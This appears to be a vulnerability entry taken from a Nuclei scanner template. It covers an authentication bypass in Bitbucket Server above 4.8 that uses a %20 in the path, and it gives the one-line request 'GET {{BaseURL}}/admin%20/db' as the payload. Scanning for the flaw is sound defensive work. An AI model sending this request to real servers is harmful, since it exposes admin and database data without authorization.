# Vulnerability: Bitbucket Server > 4.8 - Authentication Bypass
**Classification:** MISCONFIG
**Source:** Nuclei Template (`bitbucket-auth-bypass.yaml`)

## Description
There is a permission bypass vulnerability through %20, which allows arbitrary users to obtain sensitive data

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/admin%20/db
```

